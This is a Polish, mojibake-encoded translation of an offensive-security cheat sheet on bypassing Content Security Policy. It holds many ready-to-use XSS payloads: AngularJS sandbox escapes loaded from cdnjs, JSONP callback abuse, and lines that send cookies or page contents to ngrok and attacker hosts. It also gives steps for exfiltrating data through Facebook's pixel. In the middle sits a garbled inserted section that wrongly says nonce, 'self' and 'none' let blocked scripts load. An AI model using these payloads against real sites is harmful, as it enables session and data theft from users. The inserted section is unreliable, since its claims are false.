# Bypass zasad bezpieczeÅ„stwa treÅ›ci (CSP)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami nagrÃ³d za bÅ‚Ä™dy!

**SpostrzeÅ¼enia dotyczÄ…ce hakerstwa**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci na Å¼ywo z hakerstwa**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i spostrzeÅ¼eniom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## Co to jest CSP

Content Security Policy (CSP) jest uznawany za technologiÄ™ przeglÄ…darki, gÅ‚Ã³wnie majÄ…cÄ… na celu **ochronÄ™ przed atakami takimi jak cross-site scripting (XSS)**. DziaÅ‚a poprzez definiowanie i szczegÃ³Å‚owe okreÅ›lanie Å›cieÅ¼ek i ÅºrÃ³deÅ‚, z ktÃ³rych przeglÄ…darka moÅ¼e bezpiecznie Å‚adowaÄ‡ zasoby. Zasoby te obejmujÄ… rÃ³Å¼ne elementy, takie jak obrazy, ramki i JavaScript. Na przykÅ‚ad, polityka moÅ¼e zezwalaÄ‡ na Å‚adowanie i wykonanie zasobÃ³w z tego samego domeny (self), w tym zasobÃ³w wewnÄ™trznych i wykonanie kodu ciÄ…gÅ‚ego za pomocÄ… funkcji takich jak `eval`, `setTimeout` lub `setInterval`.

WdroÅ¼enie CSP odbywa siÄ™ poprzez **nagÅ‚Ã³wki odpowiedzi** lub poprzez **wÅ‚Ä…czenie elementÃ³w meta w stronie HTML**. PrzeglÄ…darki aktywnie egzekwujÄ… te postanowienia i natychmiast blokujÄ… wszelkie wykryte naruszenia.

- WdroÅ¼enie za pomocÄ… nagÅ‚Ã³wka odpowiedzi:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- WdroÅ¼one za pomocÄ… meta tagu:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### NagÅ‚Ã³wki

CSP moÅ¼e byÄ‡ egzekwowane lub monitorowane za pomocÄ… tych nagÅ‚Ã³wkÃ³w:

* `Content-Security-Policy`: Egzekwuje CSP; przeglÄ…darka blokuje wszelkie naruszenia.
* `Content-Security-Policy-Report-Only`: UÅ¼ywane do monitorowania; raportuje naruszenia bez ich blokowania. Idealne do testowania w Å›rodowiskach przedprodukcyjnych.

### Definiowanie zasobÃ³w

CSP ogranicza pochodzenie Å‚adowania zarÃ³wno aktywnych, jak i pasywnych zasobÃ³w, kontrolujÄ…c takie aspekty jak wykonywanie skryptÃ³w JavaScript w linii oraz uÅ¼ycie `eval()`. PrzykÅ‚adowa polityka to:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Dyrektywy

* **script-src**: Pozwala na okreÅ›lone ÅºrÃ³dÅ‚a dla JavaScript, w tym adresy URL, skrypty w linii, oraz skrypty wywoÅ‚ywane przez event handlery lub arkusze stylÃ³w XSLT.
* **default-src**: Ustawia domyÅ›lnÄ… politykÄ™ pobierania zasobÃ³w, gdy brakuje konkretnych dyrektyw pobierania.
* **child-src**: OkreÅ›la dozwolone zasoby dla web workerÃ³w i osadzonych treÅ›ci ramek.
* **connect-src**: Ogranicza adresy URL, ktÃ³re mogÄ… byÄ‡ Å‚adowane za pomocÄ… interfejsÃ³w takich jak fetch, WebSocket, XMLHttpRequest.
* **frame-src**: Ogranicza adresy URL dla ramek.
* **frame-ancestors**: OkreÅ›la, ktÃ³re ÅºrÃ³dÅ‚a mogÄ… osadzaÄ‡ bieÅ¼Ä…cÄ… stronÄ™, dotyczy elementÃ³w takich jak `<frame>`, `<iframe>`, `<object>`, `<embed>` i `<applet>`.
* **img-src**: Definiuje dozwolone ÅºrÃ³dÅ‚a dla obrazÃ³w.
* **font-src**: OkreÅ›la prawidÅ‚owe ÅºrÃ³dÅ‚a dla czcionek Å‚adowanych za pomocÄ… `@font-face`.
* **manifest-src**: Definiuje dozwolone ÅºrÃ³dÅ‚a plikÃ³w manifestu aplikacji.
* **media-src**: Definiuje dozwolone ÅºrÃ³dÅ‚a dla Å‚adowania obiektÃ³w multimedialnych.
* **object-src**: Definiuje dozwolone ÅºrÃ³dÅ‚a dla elementÃ³w `<object>`, `<embed>` i `<applet>`.
* **base-uri**: OkreÅ›la dozwolone adresy URL do Å‚adowania za pomocÄ… elementÃ³w `<base>`.
* **form-action**: Wymienia prawidÅ‚owe punkty koÅ„cowe dla przesyÅ‚ania formularzy.
* **plugin-types**: Ogranicza typy mime, ktÃ³re strona moÅ¼e wywoÅ‚ywaÄ‡.
* **upgrade-insecure-requests**: Instruuje przeglÄ…darki do przepisywania adresÃ³w URL HTTP na HTTPS.
* **sandbox**: Stosuje ograniczenia podobne do atrybutu sandbox `<iframe>`.
* **report-to**: OkreÅ›la grupÄ™, do ktÃ³rej zostanie wysÅ‚ane zgÅ‚oszenie, jeÅ›li polityka zostanie naruszona.
* **worker-src**: OkreÅ›la prawidÅ‚owe ÅºrÃ³dÅ‚a dla skryptÃ³w Worker, SharedWorker lub ServiceWorker.
* **prefetch-src**: OkreÅ›la prawidÅ‚owe ÅºrÃ³dÅ‚a dla zasobÃ³w, ktÃ³re zostanÄ… pobrane lub wczeÅ›niej pobrane.
* **navigate-to**: Ogranicza adresy URL, do ktÃ³rych dokument moÅ¼e nawigowaÄ‡ za pomocÄ… dowolnych Å›rodkÃ³w (a, form, window.location, window.open itp.)


### Å¹rÃ³dÅ‚a

* `*`: Pozwala na wszystkie adresy URL, z wyjÄ…tkiem tych z schematami `data:`, `blob:`, `filesystem:`.
* `'self'`: Pozwala na Å‚adowanie z tej samej domeny.
* `'data'`: Pozwala na Å‚adowanie zasobÃ³w za pomocÄ… schematu data (np. obrazy kodowane Base64).
* `'none'`: Blokuje Å‚adowanie z dowolnego ÅºrÃ³dÅ‚a.
* `'unsafe-eval'`: Pozwala na uÅ¼ycie metody `eval()` i podobnych, niezalecane ze wzglÄ™dÃ³w bezpieczeÅ„stwa.
* `'unsafe-hashes'`: WÅ‚Ä…cza okreÅ›lone inline event handlery.
* `'unsafe-inline'`: Pozwala na uÅ¼ycie zasobÃ³w inline, takich jak inline `<script>` lub `<style>`, niezalecane ze wzglÄ™dÃ³w bezpieczeÅ„stwa.
* `'nonce'`: BiaÅ‚a lista dla konkretnych skryptÃ³w inline za pomocÄ… kryptograficznego nonce (liczba uÅ¼ywana tylko raz).
* `'sha256-<hash>'`: BiaÅ‚a lista skryptÃ³w o okreÅ›lonym skrÃ³cie sha256.
* `'strict-dynamic'`: Pozwala na Å‚adowanie skryptÃ³w z dowolnego ÅºrÃ³dÅ‚a, jeÅ›li zostaÅ‚y one uwzglÄ™dnione na biaÅ‚ej liÅ›cie za pomocÄ… nonce lub skrÃ³tu.
* `'host'`: OkreÅ›la okreÅ›lony host, np. `example.com`.
* `https:`: Ogranicza adresy URL do tych, ktÃ³re uÅ¼ywajÄ… protokoÅ‚u HTTPS.
* `blob:`: Pozwala na Å‚adowanie zasobÃ³w z adresÃ³w URL Blob (np. adresy URL Blob utworzone za pomocÄ… JavaScript).
* `filesystem:`: Pozwala na Å‚adowanie zasobÃ³w z systemu plikÃ³w.
* `'report-sample'`: Zawiera przykÅ‚ad naruszajÄ…cego kodu w raporcie naruszenia (przydatne do debugowania).
* `'strict-origin'`: Podobne do 'self', ale zapewnia, Å¼e poziom bezpieczeÅ„stwa protokoÅ‚u ÅºrÃ³deÅ‚ odpowiada dokumentowi (tylko bezpieczne ÅºrÃ³dÅ‚a mogÄ… Å‚adowaÄ‡ zasoby z bezpiecznych ÅºrÃ³deÅ‚).
* `'strict-origin-when-cross-origin'`: WysyÅ‚a peÅ‚ne adresy URL podczas wykonywania Å¼Ä…daÅ„ o tym samym pochodzeniu, ale wysyÅ‚a tylko pochodzenie, gdy Å¼Ä…danie jest miÄ™dzydomenowe.
* `'unsafe-allow-redirects'`: Pozwala na Å‚adowanie zasobÃ³w, ktÃ³re natychmiast przekierowujÄ… na inny zasÃ³b. Niezalecane, poniewaÅ¼ osÅ‚abia bezpieczeÅ„stwo.


## Niebezpieczne reguÅ‚y CSP

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
DziaÅ‚ajÄ…cy payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' za pomocÄ… Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
DziaÅ‚ajÄ…cy payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

JeÅ›li w jakiÅ› sposÃ³b moÅ¼esz sprawiÄ‡, Å¼e **dozwolony kod JS tworzy nowy tag skryptu** w DOM za pomocÄ… twojego kodu JS, poniewaÅ¼ to dozwolony skrypt go tworzy, **nowy tag skryptu bÄ™dzie mÃ³gÅ‚ zostaÄ‡ wykonany**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
DziaÅ‚ajÄ…cy payload:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Brak object-src i default-src

{% hint style="danger" %}
**WyglÄ…da na to, Å¼e to juÅ¼ nie dziaÅ‚a**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
DziaÅ‚ajÄ…ce Å‚adunki:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### PrzesyÅ‚anie plikÃ³w + 'self'

W niektÃ³rych przypadkach, gdy aplikacja internetowa korzysta z polityki zabezpieczeÅ„ treÅ›ci (CSP) i zezwala na dostÄ™p tylko do okreÅ›lonych ÅºrÃ³deÅ‚, moÅ¼na znaleÅºÄ‡ sposÃ³b na obejÅ›cie tej polityki, wykorzystujÄ…c funkcjÄ™ przesyÅ‚ania plikÃ³w.

Gdy aplikacja internetowa umoÅ¼liwia przesyÅ‚anie plikÃ³w, moÅ¼e byÄ‡ moÅ¼liwe przesÅ‚anie pliku zawierajÄ…cego kod JavaScript, ktÃ³ry zostanie wykonany na stronie. W takim przypadku, jeÅ›li polityka CSP zawiera 'self' jako dozwolone ÅºrÃ³dÅ‚o, moÅ¼na wykorzystaÄ‡ to, aby obejÅ›Ä‡ politykÄ™.

Aby to zrobiÄ‡, naleÅ¼y przesÅ‚aÄ‡ plik zawierajÄ…cy kod JavaScript, ktÃ³ry wywoÅ‚a Å¼Ä…danie do strony, z ktÃ³rej chcemy pobraÄ‡ dane. W ten sposÃ³b, kod JavaScript zostanie wykonany na stronie, a Å¼Ä…danie zostanie wysÅ‚ane z domeny, ktÃ³ra jest dozwolona przez politykÄ™ CSP ('self').

PrzykÅ‚ad:
```html
<form action="https://example.com/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <input type="submit" value="Upload">
</form>
```

W powyÅ¼szym przykÅ‚adzie, plik zostanie przesÅ‚any na serwer pod wskazany adres URL. JeÅ›li na stronie docelowej istnieje podatnoÅ›Ä‡, ktÃ³ra pozwala na wykonanie kodu JavaScript z przesÅ‚anego pliku, moÅ¼na wykorzystaÄ‡ to do obejÅ›cia polityki CSP.

Warto jednak pamiÄ™taÄ‡, Å¼e to tylko jedna z wielu technik obejÅ›cia polityki CSP i zawsze naleÅ¼y przestrzegaÄ‡ prawnych i etycznych zasad podczas testowania penetracyjnego aplikacji internetowych.
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
JeÅ›li moÅ¼esz przesÅ‚aÄ‡ plik JS, moÅ¼esz ominÄ…Ä‡ tÄ™ CSP:

DziaÅ‚ajÄ…cy payload:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
JednakÅ¼e, jest bardzo prawdopodobne, Å¼e serwer **sprawdza poprawnoÅ›Ä‡ przesyÅ‚anego pliku** i pozwoli tylko na **przesyÅ‚anie okreÅ›lonego typu plikÃ³w**.

Co wiÄ™cej, nawet jeÅ›li udaÅ‚oby Ci siÄ™ przesÅ‚aÄ‡ plik zawierajÄ…cy **kod JS** z rozszerzeniem akceptowanym przez serwer (np. _script.png_), to nie wystarczy, poniewaÅ¼ niektÃ³re serwery, takie jak serwer Apache, **wybierajÄ… typ MIME pliku na podstawie rozszerzenia**, a przeglÄ…darki, takie jak Chrome, **odmÃ³wiÄ… wykonania kodu Javascript** w czymÅ›, co powinno byÄ‡ obrazem. "Na szczÄ™Å›cie" sÄ… bÅ‚Ä™dy. Na przykÅ‚ad, z jednego z zadaÅ„ CTF dowiedziaÅ‚em siÄ™, Å¼e **Apache nie rozpoznaje** rozszerzenia _**.wave**_, dlatego nie serwuje go z typem MIME, takim jak audio/\*.

StÄ…d, jeÅ›li znajdziesz XSS i moÅ¼liwoÅ›Ä‡ przesyÅ‚ania plikÃ³w, i uda Ci siÄ™ znaleÅºÄ‡ **bÅ‚Ä™dne rozszerzenie**, moÅ¼esz sprÃ³bowaÄ‡ przesÅ‚aÄ‡ plik z tym rozszerzeniem i zawartoÅ›ciÄ… skryptu. Lub, jeÅ›li serwer sprawdza poprawny format przesyÅ‚anego pliku, stwÃ³rz poliglot ([przykÅ‚ady poliglotÃ³w tutaj](https://github.com/Polydet/polyglot-database)).

### ZewnÄ™trzne punkty koÅ„cowe + ('unsafe-eval')

{% hint style="warning" %}
Dla niektÃ³rych z poniÅ¼szych payloadÃ³w **`unsafe-eval` nie jest nawet potrzebne**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
ZaÅ‚aduj podatnÄ… wersjÄ™ Angulara i wykonaj dowolny kod JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloady wykorzystujÄ…ce Angular + bibliotekÄ™ z funkcjami zwracajÄ…cymi obiekt `window` ([zobacz ten post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
W poÅ›cie pokazano, Å¼e moÅ¼na **zaÅ‚adowaÄ‡** wszystkie **biblioteki** z `cdn.cloudflare.com` (lub dowolnego innego repozytorium z dozwolonymi bibliotekami JS), wykonaÄ‡ wszystkie dodane funkcje z kaÅ¼dej biblioteki i sprawdziÄ‡, **ktÃ³re funkcje zwracajÄ… obiekt `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
#### Wykorzystywanie kodu JS google recaptcha

Zgodnie z [**tym opisem CTF**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) moÅ¼na wykorzystaÄ‡ [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) wewnÄ…trz CSP do wykonania dowolnego kodu JS omijajÄ…c CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### ZewnÄ™trzne punkty koÅ„cowe + JSONP

W niektÃ³rych przypadkach, gdy strona internetowa ma zastosowanÄ… politykÄ™ bezpieczeÅ„stwa zawartoÅ›ci (CSP), moÅ¼na prÃ³bowaÄ‡ obejÅ›Ä‡ tÄ™ politykÄ™, korzystajÄ…c z zewnÄ™trznych punktÃ³w koÅ„cowych i techniki JSONP.

JSONP (JSON with Padding) to technika, ktÃ³ra umoÅ¼liwia pobieranie danych z innej domeny, omijajÄ…c politykÄ™ samej domeny. DziaÅ‚a to poprzez dodanie skryptu do strony, ktÃ³ry pobiera dane z zewnÄ™trznego punktu koÅ„cowego i wywoÅ‚uje funkcjÄ™ zwrotnÄ…, przekazujÄ…c dane jako argument.

Aby obejÅ›Ä‡ politykÄ™ CSP, moÅ¼na uÅ¼yÄ‡ zewnÄ™trznego punktu koÅ„cowego, ktÃ³ry nie jest objÄ™ty tÄ… politykÄ…. NastÄ™pnie, poprzez wykorzystanie techniki JSONP, moÅ¼na pobraÄ‡ dane z tego punktu koÅ„cowego i przekazaÄ‡ je do strony internetowej.

Jednak naleÅ¼y pamiÄ™taÄ‡, Å¼e technika JSONP ma swoje ograniczenia i moÅ¼e byÄ‡ podatna na ataki typu XSS (Cross-Site Scripting). Dlatego zawsze naleÅ¼y dokÅ‚adnie sprawdziÄ‡, czy zewnÄ™trzny punkt koÅ„cowy jest zaufany i nie zawiera potencjalnie szkodliwego kodu.
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Scenariusze, w ktÃ³rych `script-src` jest ustawione na `self` i okreÅ›lona domena jest uwzglÄ™dniona na biaÅ‚ej liÅ›cie, moÅ¼na obejÅ›Ä‡ za pomocÄ… JSONP. Punkty koÅ„cowe JSONP pozwalajÄ… na niebezpieczne metody wywoÅ‚ania zwrotnego, co umoÅ¼liwia atakujÄ…cemu wykonanie XSS. PrzykÅ‚ad dziaÅ‚ajÄ…cego payloadu:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **zawiera gotowe do uÅ¼ycia punkty koÅ„cowe JSONP do obejÅ›cia CSP rÃ³Å¼nych stron internetowych.**

Ta sama podatnoÅ›Ä‡ wystÄ…pi, jeÅ›li **zaufany punkt koÅ„cowy zawiera przekierowanie otwarte**, poniewaÅ¼ jeÅ›li poczÄ…tkowy punkt koÅ„cowy jest zaufany, przekierowania sÄ… zaufane.

### NaduÅ¼ycia stron trzecich
Jak opisano w [poniÅ¼szym poÅ›cie](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), istnieje wiele domen stron trzecich, ktÃ³re mogÄ… byÄ‡ dozwolone gdzieÅ› w CSP, mogÄ… byÄ‡ wykorzystane do eksfiltracji danych lub wykonania kodu JavaScript. NiektÃ³re z tych stron trzecich to:

| Podmiot | Dozwolona domena | MoÅ¼liwoÅ›ci |
|--------|----------------|--------------|
| Facebook | www.facebook.com, *.facebook.com | Eksfil |
| Hotjar | *.hotjar.com, ask.hotjar.io | Eksfil |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Wykonanie |
| Amazon CloudFront | *.cloudfront.net | Eksfil, Wykonanie |
| Amazon AWS | *.amazonaws.com | Eksfil, Wykonanie |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Eksfil, Wykonanie |
| Salesforce Heroku	| *.herokuapp.com | Eksfil, Wykonanie |
| Google Firebase | *.firebaseapp.com | Eksfil, Wykonanie |

JeÅ›li znajdziesz ktÃ³rÄ…Å› z dozwolonych domen w CSP swojego celu, istnieje szansa, Å¼e bÄ™dziesz w stanie obejÅ›Ä‡ CSP, rejestrujÄ…c siÄ™ w usÅ‚udze stron trzecich i eksfiltrujÄ…c dane do tej usÅ‚ugi lub wykonujÄ…c kod.

Na przykÅ‚ad, jeÅ›li znajdziesz nastÄ™pujÄ…cy CSP:
```
Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
```
# Bypassowanie polityki zabezpieczeÅ„ treÅ›ci (CSP)

CSP (Content Security Policy) to mechanizm bezpieczeÅ„stwa stosowany na stronach internetowych, ktÃ³ry ogranicza rodzaje zasobÃ³w, ktÃ³re przeglÄ…darka moÅ¼e zaÅ‚adowaÄ‡. CSP jest uÅ¼ywany w celu ochrony przed atakami takimi jak XSS (Cross-Site Scripting) i klikanie w linki CSRF (Cross-Site Request Forgery).

Jednak istniejÄ… pewne techniki, ktÃ³re moÅ¼na zastosowaÄ‡ w celu obejÅ›cia polityki CSP i uzyskania dostÄ™pu do niedozwolonych zasobÃ³w. PoniÅ¼ej przedstawiam kilka popularnych metod:

## 1. UÅ¼ywanie zewnÄ™trznych skryptÃ³w

CSP zazwyczaj blokuje Å‚adowanie skryptÃ³w z zewnÄ™trznych ÅºrÃ³deÅ‚. Jednak moÅ¼na to obejÅ›Ä‡, korzystajÄ…c z technik takich jak:

```html
<script src="https://zly-ÅºrÃ³dÅ‚o.com/zÅ‚y-skrypt.js"></script>
```

## 2. UÅ¼ywanie atrybutu `nonce`

Atrybut `nonce` pozwala na zaÅ‚adowanie skryptÃ³w, ktÃ³re nie sÄ… zgodne z politykÄ… CSP. MoÅ¼na to zrobiÄ‡, dodajÄ…c atrybut `nonce` do tagu skryptu i ustawiajÄ…c wartoÅ›Ä‡ na dowolny unikalny ciÄ…g znakÃ³w.

```html
<script nonce="abc123" src="https://zly-ÅºrÃ³dÅ‚o.com/zÅ‚y-skrypt.js"></script>
```

## 3. UÅ¼ywanie atrybutu `unsafe-inline`

Atrybut `unsafe-inline` pozwala na wykonywanie skryptÃ³w wewnÄ…trz tagÃ³w HTML, ktÃ³re normalnie byÅ‚yby zablokowane przez CSP. MoÅ¼na to zrobiÄ‡, dodajÄ…c atrybut `unsafe-inline` do pola `script-src` w nagÅ‚Ã³wku CSP.

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
```

## 4. UÅ¼ywanie atrybutu `data:`

Atrybut `data:` pozwala na zaÅ‚adowanie zasobÃ³w, takich jak obrazy, dÅºwiÄ™ki i pliki CSS, ktÃ³re normalnie byÅ‚yby zablokowane przez CSP. MoÅ¼na to zrobiÄ‡, dodajÄ…c atrybut `data:` do pola `img-src`, `media-src` lub `style-src` w nagÅ‚Ã³wku CSP.

```html
<meta http-equiv="Content-Security-Policy" content="img-src data:">
```

## 5. UÅ¼ywanie atrybutu `blob:`

Atrybut `blob:` pozwala na zaÅ‚adowanie zasobÃ³w z Blob URL, ktÃ³re normalnie byÅ‚yby zablokowane przez CSP. MoÅ¼na to zrobiÄ‡, dodajÄ…c atrybut `blob:` do pola `img-src`, `media-src` lub `style-src` w nagÅ‚Ã³wku CSP.

```html
<meta http-equiv="Content-Security-Policy" content="img-src blob:">
```

## 6. UÅ¼ywanie atrybutu `self`

Atrybut `self` pozwala na zaÅ‚adowanie zasobÃ³w z tej samej domeny, ktÃ³re normalnie byÅ‚yby zablokowane przez CSP. MoÅ¼na to zrobiÄ‡, dodajÄ…c atrybut `self` do pola `img-src`, `media-src` lub `style-src` w nagÅ‚Ã³wku CSP.

```html
<meta http-equiv="Content-Security-Policy" content="img-src 'self'">
```

## 7. UÅ¼ywanie atrybutu `none`

Atrybut `none` blokuje Å‚adowanie zasobÃ³w z dowolnego ÅºrÃ³dÅ‚a. MoÅ¼na to zrobiÄ‡, dodajÄ…c atrybut `none` do pola `img-src`, `media-src` lub `style-src` w nagÅ‚Ã³wku CSP.

```html
<meta http-equiv="Content-Security-Policy" content="img-src 'none'">
```

## 8. UÅ¼ywanie atrybutu `report-uri`

Atrybut `report-uri` pozwala na przekierowanie raportÃ³w o naruszeniach polityki CSP do okreÅ›lonego adresu URL. MoÅ¼na to zrobiÄ‡, dodajÄ…c atrybut `report-uri` do nagÅ‚Ã³wka CSP.

```html
<meta http-equiv="Content-Security-Policy" content="report-uri /raport-csp">
```

## Podsumowanie

Pomimo skutecznoÅ›ci polityki CSP w ochronie przed atakami, istniejÄ… rÃ³Å¼ne techniki, ktÃ³re moÅ¼na zastosowaÄ‡ w celu obejÅ›cia tej polityki. WaÅ¼ne jest, aby Å›wiadomie monitorowaÄ‡ i aktualizowaÄ‡ politykÄ™ CSP, aby zapewniÄ‡ maksymalne bezpieczeÅ„stwo strony internetowej.
```
Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
```
PowinieneÅ› byÄ‡ w stanie wyciekaÄ‡ dane, podobnie jak zawsze byÅ‚o to robione za pomocÄ… [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). W tym przypadku postÄ™pujesz wedÅ‚ug tych ogÃ³lnych krokÃ³w:

1. UtwÃ³rz konto dewelopera na Facebooku tutaj.
1. UtwÃ³rz nowÄ… aplikacjÄ™ "Facebook Login" i wybierz "StronÄ™ internetowÄ…".
1. PrzejdÅº do "Ustawienia -> Podstawowe" i pobierz swoje "ID aplikacji".
1. Na stronie docelowej, z ktÃ³rej chcesz wyciekaÄ‡ dane, moÅ¼esz wyciekaÄ‡ dane, korzystajÄ…c bezpoÅ›rednio z gadÅ¼etu Facebook SDK "fbq" za pomocÄ… "customEvent" i Å‚adunku danych.
1. PrzejdÅº do "MenedÅ¼era zdarzeÅ„" swojej aplikacji i wybierz utworzonÄ… aplikacjÄ™ (zauwaÅ¼, Å¼e menedÅ¼er zdarzeÅ„ moÅ¼na znaleÅºÄ‡ pod podobnym adresem URL: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events).
